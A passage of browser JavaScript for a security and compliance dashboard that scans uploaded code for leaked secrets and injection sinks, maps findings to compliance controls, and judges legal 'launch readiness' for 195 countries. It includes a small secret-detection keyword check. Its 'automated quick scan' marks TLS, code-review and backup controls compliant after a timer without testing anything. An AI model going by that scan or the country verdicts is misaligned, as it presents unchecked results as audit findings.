        detectedFontFiles.push(file.webkitRelativePath || file.name);
        return false;
      }

      // Skip ignored directories
      if (ignoredDirPatterns.some(pattern => lower.includes(pattern))) {
        return false;
      }

      // Skip binary extensions
      if (binaryExts.some(ext => lower.endsWith(ext))) {
        return false;
      }

      // Max size per file to prevent browser freeze: 2MB
      if (file.size > 2 * 1024 * 1024) {
        return false;
      }

      return true;
    });

    if (codeFiles.length === 0 && !bundledFontsDetected) {
      this.showToast('No readable source code or configuration files found in the selection.');
      return;
    }

    if (this.uploadStatusText) {
      this.uploadStatusText.innerHTML = `<span class="pulse-dot"></span> Reading <strong>${codeFiles.length} file(s)</strong> across app bundle...`;
    }

    let totalLines = 0;
    let combinedContent = '';
    let filesRead = 0;

    // If local font assets were detected in bundle, prepend note to context
    if (bundledFontsDetected) {
      combinedContent += `// [BUNDLE ASSETS DETECTED]: Found ${detectedFontFiles.length} bundled local font file(s) in repository (e.g. ${detectedFontFiles.slice(0, 3).join(', ')}).\n// assets: - assets/fonts/\n\n`;
    }

    // Limit scanned files to 200 most relevant to avoid browser memory crash
    const filesToRead = codeFiles.slice(0, 200);

    filesToRead.forEach(file => {
      const relPath = file.webkitRelativePath || file.name;
      const reader = new FileReader();
      reader.onload = (e) => {
        const text = e.target.result || '';
        combinedContent += `\n// ==========================================\n// File: ${relPath}\n// ==========================================\n` + text + `\n`;
        totalLines += text.split('\n').length;
        filesRead++;

        if (filesRead === filesToRead.length) {
          if (this.codeEditorInput) {
            this.codeEditorInput.value = combinedContent;
            this.updateCodeCounters();
          }

          let bundleSummary = `✅ Analyzed <strong>${filesRead} code file(s)</strong> (${totalLines.toLocaleString()} lines).`;
          if (bundledFontsDetected) {
            bundleSummary += ` <em>Found ${detectedFontFiles.length} local bundled font asset(s).</em>`;
          }

          if (this.uploadStatusText) {
            this.uploadStatusText.innerHTML = bundleSummary;
          }

          this.runCodeSecurityScan();
          this.showToast(`Analyzed ${filesRead} file(s) (${totalLines.toLocaleString()} lines) in App Bundle!`);

          // Switch to Code & Secret Scanner tab to see findings
          const codeTabBtn = document.querySelector('.nav-tab[data-tab="codescan"]');
          if (codeTabBtn) codeTabBtn.click();
        }
      };
      reader.onerror = () => {
        filesRead++;
      };
      reader.readAsText(file);
    });
  }

  runCodeSecurityScan() {
    if (!this.codeEditorInput) return;
    const rawCode = this.codeEditorInput.value;
    if (!rawCode || !rawCode.trim()) {
      this.showToast('Please paste code or select a vulnerability preset first.');
      return;
    }

    const lines = rawCode.split('\n');
    const findings = [];
    let criticalCount = 0;
    let highCount = 0;
    let secretsCount = 0;
    let sqlCount = 0;

    lines.forEach((lineText, idx) => {
      const lineNum = idx + 1;
      const trimmed = lineText.trim();
      // Skip simple single-line comment headers unless they look like secrets
      if (trimmed.startsWith('//') && !trimmed.includes('AKIA') && !trimmed.includes('sk-') && !trimmed.includes('postgres://')) {
        return;
      }

      CODE_VULN_RULES.forEach(rule => {
        if (rule.test(lineText, rawCode, idx, lines)) {
          const already = findings.some(f => f.line === lineNum && f.ruleId === rule.id);
          if (!already) {
            findings.push({
              line: lineNum,
              ruleId: rule.id,
              category: rule.category,
              title: rule.title,
              severity: rule.severity,
              cwe: rule.cwe,
              owasp: rule.owasp,
              complianceControl: rule.complianceControl,
              exploit: rule.exploit,
              snippet: lineText.trim(),
              badCode: rule.badCode,
              goodCode: rule.goodCode
            });

            if (rule.severity === 'critical') criticalCount++;
            if (rule.severity === 'high') highCount++;
            if (rule.category === 'Secret Leak') secretsCount++;
            if (rule.category === 'Database Attacks') sqlCount++;
          }
        }
      });
    });

    this.latestCodeFindings = findings;

    // Update tab badge
    if (this.tabCodeVulnCount) {
      this.tabCodeVulnCount.innerText = findings.length;
    }

    // Update summary chips
    if (this.flawsCritical) this.flawsCritical.innerText = criticalCount;
    if (this.flawsHigh) this.flawsHigh.innerText = highCount;
    if (this.flawsSecrets) this.flawsSecrets.innerText = secretsCount;
    if (this.flawsSql) this.flawsSql.innerText = sqlCount;

    // Calculate Grade
    let grade = 'A';
    let gradeClass = 'grade-a';

    if (criticalCount > 0) {
      grade = 'F';
      gradeClass = 'grade-f';
    } else if (highCount >= 2) {
      grade = 'D';
      gradeClass = 'grade-f';
    } else if (highCount === 1) {
      grade = 'C';
      gradeClass = 'grade-c';
    } else if (findings.length > 0) {
      grade = 'B';
      gradeClass = 'grade-b';
    }

    if (this.scanRiskGrade && this.gradeLetter) {
      this.scanRiskGrade.className = `scan-grade-badge ${gradeClass}`;
      this.gradeLetter.innerText = grade;
    }

    if (this.scanTimestamp) {
      this.scanTimestamp.innerText = `Scanned at ${new Date().toLocaleTimeString()} • ${findings.length} findings`;
    }

    // Show sync bar if findings exist
    if (this.syncActionBar) {
      this.syncActionBar.style.display = findings.length > 0 ? 'flex' : 'none';
    }

    this.renderCodeFindings(findings);
    this.renderGlobalLaunchReadiness();
  }

  renderCodeFindings(findings) {
    if (!this.findingsContainer) return;
    this.findingsContainer.innerHTML = '';

    if (findings.length === 0) {
      this.findingsContainer.innerHTML = `
        <div class="empty-findings-state" style="color: var(--green);">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color: var(--green); opacity: 1;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
          <h4 style="font-size: 1.15rem; font-weight: 700; color: #fff; margin-bottom: 6px;">Clean Security Scan!</h4>
          <p style="color: var(--text-secondary); font-size: 0.88rem;">No hardcoded secrets, SQL injection concatenations, or dangerous eval/RCE sinks detected in the provided code.</p>
        </div>
      `;
      return;
    }

    findings.forEach(f => {
      const card = document.createElement('div');
      card.className = `finding-card sev-${f.severity}`;
      card.innerHTML = `
        <div class="finding-top-row">
          <div class="finding-meta">
            <span class="finding-sev-pill ${f.severity}">${f.severity}</span>
            <span class="finding-line-badge">Line ${f.line}</span>
            <span class="finding-rule-tag">${f.ruleId} &bull; ${f.category}</span>
          </div>
          <span style="font-size: 0.72rem; color: var(--cyan); font-weight: 600;">Control ${f.complianceControl}</span>
        </div>
        <div class="finding-title">${f.title}</div>
        <div class="finding-exploit-box">
          <strong>Hacker Attack Vector:</strong> ${f.exploit}
        </div>
        <div style="font-size: 0.74rem; color: var(--text-muted); margin-bottom: 2px;">Vulnerable Code:</div>
        <div class="finding-code-preview">${this.escapeHTML(f.snippet)}</div>
        <div class="finding-fix-box">
          <div class="fix-header">
            <span>🛡️ Recommended Secure Remediation:</span>
          </div>
          <div style="font-size: 0.76rem; color: var(--text-muted);">${f.cwe} (${f.owasp})</div>
          <pre class="fix-code">${f.goodCode}</pre>
        </div>
      `;
      this.findingsContainer.appendChild(card);
    });
  }

  escapeHTML(str) {
    return str.replace(/[&<>'"]/g, 
      tag => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        "'": '&#39;',
        '"': '&quot;'
      }[tag] || tag)
    );
  }

  syncFindingsToCompliance() {
    if (!this.latestCodeFindings || this.latestCodeFindings.length === 0) return;

    let updatedControls = 0;
    this.latestCodeFindings.forEach(f => {
      if (f.complianceControl && this.answers[f.complianceControl] !== 'gap') {
        this.answers[f.complianceControl] = 'gap';
        updatedControls++;
      }
    });

    this.saveAnswers();
    this.render();
    this.renderGlobalLaunchReadiness();
    this.showToast(`Updated ${updatedControls} compliance controls to Non-Compliant (Gap) based on code security flaws!`);
  }

  // --- Automated URL Quick Heuristic Scanner ---
  runAutomatedQuickScan() {
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const appUrl = this.appUrlInput.value.trim();

    const btn = document.getElementById('btnFastScan');
    const origHTML = btn.innerHTML;
    btn.innerHTML = `<span class="pulse-dot"></span> Auditing...`;
    btn.disabled = true;

    setTimeout(() => {
      btn.innerHTML = origHTML;
      btn.disabled = false;

      // Automatically deduce basic secure defaults
      this.answers['DATA-01'] = 'compliant'; // Modern web defaults TLS
      this.answers['OPS-02'] = 'compliant'; // Git PR reviews
      this.answers['OPS-03'] = 'compliant'; // Cloud backups

      if (appUrl.startsWith('https://')) {
        this.answers['DATA-01'] = 'compliant';
      }

      this.saveAnswers();
      this.render();
      this.showToast(`Initial automated check completed for "${appName}". Review detailed checklist below.`);
    }, 750);
  }

  // --- Calculations ---
  calculateMetrics() {
    let totalPass = 0;
    let totalGap = 0;
    let totalAnswered = 0;

    CONTROLS.forEach(c => {
      const st = this.answers[c.id];
      if (st === 'compliant') totalPass++;
      else if (st === 'gap') totalGap++;
      if (st) totalAnswered++;
    });

    const totalControls = CONTROLS.length;
    const pending = totalControls - totalAnswered;
    const overallScore = totalControls > 0 ? Math.round((totalPass / totalControls) * 100) : 0;

    // Framework scores
    const fwScores = {};
    FRAMEWORKS.forEach(fw => {
      const fwControls = CONTROLS.filter(c => c.frameworks.includes(fw.id));
      const passed = fwControls.filter(c => this.answers[c.id] === 'compliant').length;
      const gaps = fwControls.filter(c => this.answers[c.id] === 'gap').length;
      const score = fwControls.length > 0 ? Math.round((passed / fwControls.length) * 100) : 0;
      fwScores[fw.id] = { total: fwControls.length, passed, gaps, score };
    });

    return { totalPass, totalGap, pending, totalAnswered, totalControls, overallScore, fwScores };
  }

  render() {
    const metrics = this.calculateMetrics();

    // Update overall ring
    this.overallScoreVal.innerText = `${metrics.overallScore}%`;
    const circumference = 264;
    const offset = circumference - (metrics.overallScore / 100) * circumference;
    this.overallRing.style.strokeDashoffset = offset;

    // Update color of circle ring based on score
    if (metrics.overallScore >= 80) {
      this.overallRing.style.stroke = 'var(--green)';
    } else if (metrics.overallScore >= 45) {
      this.overallRing.style.stroke = 'var(--amber)';
    } else {
      this.overallRing.style.stroke = 'var(--cyan)';
    }

    // Mini stats
    this.passCountEl.innerText = metrics.totalPass;
    this.gapCountEl.innerText = metrics.totalGap;
    this.pendingCountEl.innerText = metrics.pending;

    // Tabs counters
    this.tabAnsweredCount.innerText = metrics.totalAnswered;
    this.tabTotalCount.innerText = metrics.totalControls;
    this.tabGapsCount.innerText = metrics.totalGap;

    this.renderFrameworkCards(metrics.fwScores);
    this.renderControlsList();
    this.renderGapsList();
    this.renderRoadmap();
    this.renderPolicy('ir', 'Incident Response Plan');
    this.renderGlobalLaunchReadiness();
  }

  // --- Render Framework Overview Cards ---
  renderFrameworkCards(fwScores) {
    this.cardsContainer.innerHTML = '';

    // "All Controls" Card
    const allCard = document.createElement('div');
    allCard.className = `fw-card ${this.activeFramework === 'all' ? 'active' : ''}`;
    allCard.innerHTML = `
      <div class="fw-card-top">
        <div class="fw-icon-box">⚡</div>
        <span class="fw-score-badge ready">Unified</span>
      </div>
      <div>
        <div class="fw-name">All Frameworks</div>
        <div class="fw-desc">Comprehensive cross-mapped baseline matrix across all 6 standards.</div>
        <div class="fw-progress-track">
          <div class="fw-progress-fill" style="width: 100%"></div>
        </div>
        <div class="fw-stats-mini">
          <span>${CONTROLS.length} Total Controls</span>
          <span>Unified View</span>
        </div>
      </div>
    `;
    allCard.addEventListener('click', () => {
      this.activeFramework = 'all';
      this.render();
    });
    this.cardsContainer.appendChild(allCard);

    // Individual Frameworks
    FRAMEWORKS.forEach(fw => {
      const data = fwScores[fw.id] || { score: 0, passed: 0, total: 0 };
      const card = document.createElement('div');
      card.className = `fw-card ${this.activeFramework === fw.id ? 'active' : ''}`;

      let badgeClass = 'partial';
      if (data.score >= 80) badgeClass = 'ready';
      else if (data.score < 40) badgeClass = 'danger';

      card.innerHTML = `
        <div class="fw-card-top">
          <div class="fw-icon-box">${fw.icon}</div>
          <span class="fw-score-badge ${badgeClass}">${data.score}%</span>
        </div>
        <div>
          <div class="fw-name">${fw.name}</div>
          <div class="fw-desc">${fw.desc}</div>
          <div class="fw-progress-track">
            <div class="fw-progress-fill" style="width: ${data.score}%"></div>
          </div>
          <div class="fw-stats-mini">
            <span>${data.passed}/${data.total} Passed</span>
            <span>${data.gaps} Gaps</span>
          </div>
        </div>
      `;
      card.addEventListener('click', () => {
        this.activeFramework = fw.id;
        this.render();
      });
      this.cardsContainer.appendChild(card);
    });
  }

  // --- Filtering ---
  getFilteredControls() {
    return CONTROLS.filter(c => {
      // Framework filter
      if (this.activeFramework !== 'all' && !c.frameworks.includes(this.activeFramework)) {
        return false;
      }
      // Category filter
      if (this.activeCategory !== 'all' && c.category !== this.activeCategory) {
        return false;
      }
      // Status filter
      const st = this.answers[c.id];
      if (this.activeStatus === 'compliant' && st !== 'compliant') return false;
      if (this.activeStatus === 'gap' && st !== 'gap') return false;
      if (this.activeStatus === 'unanswered' && st !== undefined) return false;

      // Text search
      if (this.searchQuery) {
        const hay = `${c.id} ${c.title} ${c.desc} ${c.citations} ${c.category}`.toLowerCase();
        if (!hay.includes(this.searchQuery)) return false;
      }

      return true;
    });
  }

  // --- Render Checklist Controls ---
  renderControlsList() {
    const list = this.getFilteredControls();
    this.controlsContainer.innerHTML = '';

    if (list.length === 0) {
      this.controlsContainer.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--text-secondary);">
          <p style="font-size: 1.1rem; margin-bottom: 8px;">No controls match the current filter criteria.</p>
          <span style="font-size: 0.85rem; color: var(--text-muted);">Try clearing search terms or changing category/framework filters.</span>
        </div>
      `;
      return;
    }

    list.forEach(c => {
      const card = document.createElement('div');
      const status = this.answers[c.id] || 'unanswered';
      card.className = `control-card status-${status}`;

      const fwTagsHTML = c.frameworks.map(f => `<span class="tag-fw">${f.toUpperCase()}</span>`).join('');

      card.innerHTML = `
        <div class="ctrl-main">
          <div class="ctrl-meta">
            <span class="ctrl-id-badge">${c.id}</span>
            <span class="ctrl-cat-tag">${c.category}</span>
            <div class="ctrl-fw-tags">${fwTagsHTML}</div>
          </div>
          <h3 class="ctrl-title">${c.title}</h3>
          <p class="ctrl-desc">${c.desc}</p>
          <div class="ctrl-remediation-tip">
            <strong>Standard Citations:</strong> ${c.citations}
          </div>
        </div>

        <div class="ctrl-actions">
          <div class="btn-toggle-group">
            <button class="toggle-opt ${status === 'compliant' ? 'selected-pass' : ''}" data-status="compliant">
              ✓ Compliant
            </button>
            <button class="toggle-opt ${status === 'gap' ? 'selected-gap' : ''}" data-status="gap">
              ✕ Gap
            </button>
            <button class="toggle-opt ${status === 'unanswered' ? 'selected-na' : ''}" data-status="clear">
              — Skip
            </button>
          </div>
          <button class="btn-details-link" data-id="${c.id}">View Audit Evidence Proof →</button>
        </div>
      `;

      // Toggle clicks
      const toggleBtns = card.querySelectorAll('.toggle-opt');
      toggleBtns.forEach(btn => {
        btn.addEventListener('click', () => {
          const st = btn.dataset.status;
          if (st === 'clear') {
            delete this.answers[c.id];
          } else {
            this.answers[c.id] = st;
          }
          this.saveAnswers();
          this.render();
        });
      });

      // View details
      card.querySelector('.btn-details-link').addEventListener('click', () => {
        this.openControlModal(c.id);
      });

      this.controlsContainer.appendChild(card);
    });
  }

  // --- Render Identified Gaps ---
  renderGapsList() {
    const gaps = CONTROLS.filter(c => this.answers[c.id] === 'gap');
    this.gapsContainer.innerHTML = '';

    const highGaps = gaps.filter(g => g.severity === 'high');
    const medGaps = gaps.filter(g => g.severity === 'medium');
    const lowGaps = gaps.filter(g => g.severity === 'low');

    document.getElementById('highGapCount').innerText = highGaps.length;
    document.getElementById('medGapCount').innerText = medGaps.length;
    document.getElementById('lowGapCount').innerText = lowGaps.length;

    if (gaps.length === 0) {
      this.gapsContainer.innerHTML = `
        <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--green);">
          <div style="font-size: 2.2rem; margin-bottom: 8px;">🎉</div>
          <h4 style="font-size: 1.2rem; font-weight: 700; margin-bottom: 6px;">Zero Non-Compliance Gaps Flagged!</h4>
          <p style="color: var(--text-secondary); font-size: 0.88rem;">Mark controls as "Gap" in the checklist to generate remediation tasks.</p>
        </div>
      `;
      return;
    }

    gaps.forEach(g => {
      const item = document.createElement('div');
      item.className = 'gap-item-card';
      item.innerHTML = `
        <div class="gap-head">
          <div>
            <span class="ctrl-id-badge" style="margin-right: 8px;">${g.id}</span>
            <strong style="font-size: 1.05rem;">${g.title}</strong>
          </div>
          <span class="gap-risk-badge ${g.severity}">${g.severity} Priority</span>
        </div>
        <p style="font-size: 0.88rem; color: var(--text-secondary); margin-bottom: 12px;">${g.desc}</p>
        <div style="background: rgba(15, 23, 42, 0.7); padding: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-color); font-size: 0.85rem;">
          <div style="color: var(--cyan); font-weight: 700; margin-bottom: 4px;">🛠️ Remediation Recommendation:</div>
          <div style="color: #cbd5e1;">${g.remediationTip}</div>
        </div>
      `;
      this.gapsContainer.appendChild(item);
    });
  }

  // --- Render Remediation Roadmap ---
  renderRoadmap() {
    this.roadmapContainer.innerHTML = '';
    const gaps = CONTROLS.filter(c => this.answers[c.id] === 'gap');

    const stages = [
      {
        title: 'Phase 1: Foundational Controls & Security Killswitches (Week 1–2)',
        items: [
          'Enforce Multi-Factor Authentication (MFA) via SSO on 100% of admin accounts',
          'Ensure TLS 1.2+ and HSTS enabled on all web domains and API gateways',
          'Activate automated database backups with encryption at rest (KMS AES-256)',
          'Implement user data erasure queue for GDPR Article 17 compliance'
        ]
      },
      {
        title: 'Phase 2: DevSecOps, Branch Protection & Centralized Logging (Week 3–4)',
        items: [
          'Enable branch protection with mandatory PR reviews and SAST / Dependabot checks',
          'Forward all audit trails to centralized log storage with 365-day tamper retention',
          'Deploy real-time alerting for privileged account escalations to PagerDuty/Slack',
          'Execute HIPAA Business Associate Agreements (BAAs) with all sub-processors'
        ]
      },
      {
        title: 'Phase 3: Formal Attestation, Pentest & Auditor Readiness (Week 5–6)',
        items: [
          'Engage certified penetration testing firm for annual grey-box web test',
          'Complete and publish formal Incident Response Plan & Data Retention Policies',
          'Conduct and record quarterly access reviews for all production datastores',
          'Onboard audit platform (e.g. Vanta, Drata) and run auditor observation window'
        ]
      }
    ];

    stages.forEach((stage, idx) => {
      const block = document.createElement('div');
      block.className = 'stage-block';

      const stepsHTML = stage.items.map((step, sIdx) => `
        <li class="stage-step-item">
          <input type="checkbox" id="step_${idx}_${sIdx}">
          <label for="step_${idx}_${sIdx}">${step}</label>
        </li>
      `).join('');

      block.innerHTML = `
        <div class="stage-title">
          <span>0${idx + 1}</span>
          <span>${stage.title}</span>
        </div>
        <ul class="stage-steps-list">${stepsHTML}</ul>
      `;
      this.roadmapContainer.appendChild(block);
    });
  }

  // --- Render Selected Policy Template ---
  renderPolicy(policyKey, title) {
    const template = POLICY_TEMPLATES[policyKey] || '';
    const appName = this.appNameInput.value.trim() || 'My Web Application';
    const domain = this.appUrlInput.value.trim().replace(/^https?:\/\//, '') || 'app.example.com';

    const rendered = template
      .replace(/{{APP_NAME}}/g, appName)
      .replace(/{{DOMAIN}}/g, domain);

    this.policyTitle.innerText = title;
    this.policyPreview.innerText = rendered;
  }

  // --- Modal: Control Inspector ---
  openControlModal(id) {
    const c = CONTROLS.find(item => item.id === id);
    if (!c) return;
    this.currentModalControlId = id;

    document.getElementById('modalCategory').innerText = `${c.category} • ${c.severity.toUpperCase()} SEVERITY`;
    document.getElementById('modalTitle').innerText = `${c.id}: ${c.title}`;

    const body = document.getElementById('modalBody');
    body.innerHTML = `
      <div style="margin-bottom: 16px;">
        <h4 style="font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">Control Description</h4>
        <p>${c.desc}</p>
      </div>

      <div style="margin-bottom: 16px; background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: var(--radius-sm);">
        <h4 style="font-size: 0.85rem; color: var(--cyan); text-transform: uppercase; margin-bottom: 4px;">Auditor Evidence & Artifact Proof Required</h4>
        <p style="color: #cbd5e1;">${c.auditorProof}</p>
      </div>

      <div style="margin-bottom: 16px; background: rgba(15, 23, 42, 0.6); padding: 12px; border-radius: var(--radius-sm);">
        <h4 style="font-size: 0.85rem; color: var(--green); text-transform: uppercase; margin-bottom: 4px;">Remediation & Implementation Guidance</h4>
        <p style="color: #cbd5e1;">${c.remediationTip}</p>
      </div>

      <div>
        <h4 style="font-size: 0.85rem; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 4px;">Mapped Regulatory Citations</h4>
        <p style="font-family: var(--font-mono); font-size: 0.82rem; color: var(--cyan);">${c.citations}</p>
      </div>
    `;

    this.controlModal.classList.add('open');
  }

  setControlStatus(id, status) {
    this.answers[id] = status;
    this.saveAnswers();
    this.render();
    this.showToast(`Updated ${id} to ${status}`);
  }

  // --- Global Jurisdictional Launch Readiness Engine ---
  evaluateGlobalLaunchReadiness() {
    const findings = this.latestCodeFindings || [];
    const answers = this.answers || {};

    const jurisdictionResults = [];
    const jurisdictionMap = new Map();

    JURISDICTIONS.forEach(j => {
      const evaluation = j.evaluate(findings, answers);
      const res = {
        jurisdiction: j,
        status: evaluation.status,
        blockers: evaluation.blockers || [],
        warnings: evaluation.warnings || [],
        fixes: evaluation.fixes || []
      };
      jurisdictionResults.push(res);
      jurisdictionMap.set(j.id, res);
    });

    // Evaluate all 195 sovereign nations
    const evaluatedCountries = [];
    const blockedCountries = [];
    const allowedCountries = [];
    const restrictedCountries = [];

    GLOBAL_COUNTRY_CATALOGUE.forEach(c => {
      // Determine applicable jurisdictions
      const jIds = c.jId === 'us-composite' ? ['us-fed', 'us-ca', 'us-wiretap'] : [c.jId];
      const combinedBlockers = [];
      const combinedWarnings = [];

      jIds.forEach(id => {
        const ev = jurisdictionMap.get(id);
        if (ev) {
          if (ev.blockers) combinedBlockers.push(...ev.blockers);
          if (ev.warnings) combinedWarnings.push(...ev.warnings);
        }
      });

      // Deduplicate blockers by title
      const uniqueBlockers = [];
      const seenBlockers = new Set();
      combinedBlockers.forEach(b => {
        if (!seenBlockers.has(b.title)) {
          seenBlockers.add(b.title);
          uniqueBlockers.push(b);
        }
      });

      // Deduplicate warnings by title
      const uniqueWarnings = [];
      const seenWarnings = new Set();
      combinedWarnings.forEach(w => {
        if (!seenWarnings.has(w.title)) {
          seenWarnings.add(w.title);
          uniqueWarnings.push(w);
        }
      });

      let status = 'ready';
      if (uniqueBlockers.length > 0) {
        status = 'blocked';
      } else if (uniqueWarnings.length > 0) {
        status = 'restricted';
      }

      // Find primary jurisdiction info
      const primaryJurisdiction = jurisdictionMap.get(jIds[0])?.jurisdiction || {
        governingLaws: 'National Data Protection Legislation',
        statutoryPenalties: 'National Regulatory Fines & Statutory Damages',
        regulatoryBody: 'National Data Protection Authority'
      };

      const countryItem = {
        name: c.name,
        flag: c.flag,
        region: c.region,
        status,
        jurisdictionName: primaryJurisdiction.name,
        governingLaws: primaryJurisdiction.governingLaws,
        statutoryPenalties: primaryJurisdiction.statutoryPenalties,
        regulatoryBody: primaryJurisdiction.regulatoryBody,
        blockers: uniqueBlockers,
        warnings: uniqueWarnings
      };

      evaluatedCountries.push(countryItem);

      if (status === 'blocked') {
        blockedCountries.push(countryItem);
      } else if (status === 'restricted') {
        restrictedCountries.push(countryItem);
        allowedCountries.push(countryItem);
      } else {
        allowedCountries.push(countryItem);
      }
    });

    let totalBlockersCount = 0;
    jurisdictionResults.forEach(r => {
      totalBlockersCount += r.blockers.length;
    });

    let globalVerdict = 'ready';
    let verdictTitle = '✅ Worldwide Launch Ready';
    let verdictDesc = `Safe to deploy across all 195 sovereign nations and all ${JURISDICTIONS.length} evaluated regulatory jurisdictions without legal blockers.`;

    if (blockedCountries.length > 0 && allowedCountries.length > 0) {
      globalVerdict = 'restricted';
      verdictTitle = `⚠️ Regionally Restricted Launch (${allowedCountries.length} Countries Permitted, ${blockedCountries.length} Blocked)`;
      verdictDesc = `App is legally compliant to launch in ${allowedCountries.length} countries, but has statutory blockers preventing launch in ${blockedCountries.length} countries. Review the required technical fixes below to unlock global launch readiness.`;
    } else if (blockedCountries.length > 0 && allowedCountries.length === 0) {
      globalVerdict = 'blocked';
      verdictTitle = `⛔ Launch Blocked Worldwide (${blockedCountries.length} Countries Blocked)`;
      verdictDesc = `Critical statutory blockers (e.g., missing child age gates, credential leaks, or dynamic font surveillance) prevent launch across target global jurisdictions. Fix detected vulnerabilities before release.`;
    }

    return {
      globalVerdict,
      verdictTitle,
      verdictDesc,
      totalJurisdictions: JURISDICTIONS.length,
      totalCountriesCount: evaluatedCountries.length,
      allowedCountriesCount: allowedCountries.length,
      blockedCountriesCount: blockedCountries.length,
      restrictedCountriesCount: restrictedCountries.length,
      totalBlockersCount,
      evaluatedCountries,
      allowedCountries,
      blockedCountries,
      restrictedCountries,
      jurisdictionResults
    };
  }

  renderGlobalLaunchReadiness() {
    const data = this.evaluateGlobalLaunchReadiness();

    // Update tab badge
    if (this.tabLaunchBlockedCount) {
      this.tabLaunchBlockedCount.innerText = data.blockedCountriesCount > 0 ? `${data.blockedCountriesCount} Blocked` : 'Safe';
      this.tabLaunchBlockedCount.className = data.blockedCountriesCount > 0 ? 'badge-accent' : 'badge-accent ready';
    }

    // Update mini stats in DOM if present

    // Render Hero Verdict Banner
    if (this.launchHeroBanner) {
      let verdictClass = 'verdict-ready';
      let icon = '🌍';
      if (data.globalVerdict === 'blocked') {
        verdictClass = 'verdict-blocked';
        icon = '⛔';
      } else if (data.globalVerdict === 'restricted') {
        verdictClass = 'verdict-restricted';
        icon = '⚠️';
      }

      this.launchHeroBanner.innerHTML = `
        <div class="launch-verdict-header">
          <div class="verdict-icon-box ${verdictClass}">${icon}</div>
          <div class="verdict-copy">
            <div class="verdict-pill ${verdictClass}">
              <span>${data.globalVerdict.toUpperCase()} STATUS</span>
            </div>
            <h2 class="verdict-title">${data.verdictTitle}</h2>
            <p class="verdict-desc">${data.verdictDesc}</p>
          </div>
        </div>
        <div class="launch-summary-counters">
          <div class="launch-counter-card">
            <span class="count-val" id="launchStatTotal">${data.totalCountriesCount}</span>
            <span class="count-lbl">Total Countries (Worldwide)</span>
          </div>
          <div class="launch-counter-card">
            <span class="count-val green" id="launchStatAllowed">${data.allowedCountriesCount}</span>
            <span class="count-lbl">Allowed Countries</span>
          </div>
          <div class="launch-counter-card">
            <span class="count-val red" id="launchStatBlocked">${data.blockedCountriesCount}</span>
            <span class="count-lbl">Blocked Countries</span>
          </div>
          <div class="launch-counter-card">
            <span class="count-val amber" id="launchStatBlockers">${data.totalBlockersCount}</span>
            <span class="count-lbl">Actionable Fixes</span>
          </div>
        </div>
      `;
    }

    if (!this.jurisdictionsContainer) return;
    this.jurisdictionsContainer.innerHTML = '';

    const searchQuery = this.launchSearchInput ? this.launchSearchInput.value.toLowerCase().trim() : '';
    const statusFilter = this.launchStatusFilter ? this.launchStatusFilter.value : 'all';

    // RENDER MODE 1: Specific Countries List View (Default)
    if (this.launchViewMode !== 'jurisdictions') {
      let filteredCountries = data.evaluatedCountries.filter(c => {
        // Status filter
        if (statusFilter === 'blocked' && c.status !== 'blocked') return false;
        if (statusFilter === 'ready' && c.status !== 'ready') return false;
        if (statusFilter === 'restricted' && c.status !== 'restricted') return false;

        // Search query filter (matches country name, region, law, or blocker reason)
        if (searchQuery) {
          const nameMatch = c.name.toLowerCase().includes(searchQuery);
          const regionMatch = c.region.toLowerCase().includes(searchQuery);
          const lawMatch = c.governingLaws.toLowerCase().includes(searchQuery);
          const blockerMatch = c.blockers.some(b => b.title.toLowerCase().includes(searchQuery) || b.desc.toLowerCase().includes(searchQuery));
          if (!nameMatch && !regionMatch && !lawMatch && !blockerMatch) {
            return false;
          }
        }

        return true;
      });

      if (filteredCountries.length === 0) {
        this.jurisdictionsContainer.innerHTML = `
          <div class="glass-panel" style="padding: 40px; text-align: center; color: var(--text-secondary); grid-column: 1 / -1;">
            <p style="font-size: 1.1rem; margin-bottom: 8px;">No countries match your search "${this.escapeHTML(searchQuery)}".</p>
            <span style="font-size: 0.85rem; color: var(--text-muted);">Try searching for any of the 195 nations (e.g. "Germany", "India", "United States", "Canada", "Singapore", "Japan", "Brazil", "France").</span>
          </div>
        `;
        return;
      }

      const blockedFiltered = filteredCountries.filter(c => c.status === 'blocked');
      const allowedFiltered = filteredCountries.filter(c => c.status !== 'blocked');

      let html = '';

      // Section A: Blocked Countries
      if (blockedFiltered.length > 0) {
        const blockedCards = blockedFiltered.map(c => {
          const blockerItems = c.blockers.map(b => `
            <div class="blocker-item">
              <div class="blocker-head">
                <span class="blocker-dot"></span>
                <strong>${this.escapeHTML(b.title)}</strong>
                <span class="blocker-law-tag">${this.escapeHTML(b.law)}</span>
              </div>
              <p class="blocker-desc">${this.escapeHTML(b.desc)}</p>
              <div class="blocker-fix-action">
                <span class="fix-label">🛠️ What You Need to Do in ${this.escapeHTML(c.name)}:</span>
                <div class="fix-text">${this.escapeHTML(b.fix)}</div>
              </div>
            </div>
          `).join('');

          return `
            <div class="jurisdiction-card status-blocked">
              <div class="jurisdiction-card-header">
                <div class="jurisdiction-flag-title">
                  <span class="jurisdiction-flag">${c.flag}</span>
                  <div>
                    <h3 class="jurisdiction-name">${this.escapeHTML(c.name)}</h3>
                    <span class="jurisdiction-region">${this.escapeHTML(c.region)} &bull; Jurisdiction: ${this.escapeHTML(c.jurisdictionName)}</span>
                  </div>
                </div>
                <span class="jurisdiction-status-badge badge-blocked">⛔ LAUNCH BLOCKED</span>
              </div>

              <div class="jurisdiction-legal-info">
                <div class="legal-row">
                  <span class="lbl">Governing Laws:</span>
                  <span class="val font-mono">${this.escapeHTML(c.governingLaws)}</span>
                </div>
                <div class="legal-row">
                  <span class="lbl">Statutory Penalties:</span>
                  <span class="val penalty-val">${this.escapeHTML(c.statutoryPenalties)}</span>
                </div>
                <div class="legal-row">
                  <span class="lbl">Regulatory Authority:</span>
                  <span class="val">${this.escapeHTML(c.regulatoryBody)}</span>
                </div>
              </div>

              <div class="jurisdiction-blockers-section">
                <div class="blockers-header">
                  <span>Why is it NOT allowed in ${this.escapeHTML(c.name)}?</span>
